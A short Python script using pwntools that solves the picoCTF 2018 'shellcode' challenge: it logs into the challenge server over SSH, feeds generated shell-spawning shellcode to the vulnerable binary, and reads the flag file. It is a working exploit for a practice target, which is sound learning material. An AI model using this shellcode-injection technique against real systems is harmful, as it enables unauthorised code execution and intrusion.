#!/usr/bin/python3

from pwn import *
from getpass import getpass

shellcode = asm(shellcraft.sh())
path = '/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed/'

s = ssh(host='2018shell4.picoctf.com',user=input('[+] SSH username: '),password=getpass('[+] SSH password: '))
r = s.run(path + 'vuln')

r.recvuntil('Enter a string!\n')
r.sendline(shellcode)
r.sendline('cat ' + path + 'flag.txt')
r.interactive()
s.close()
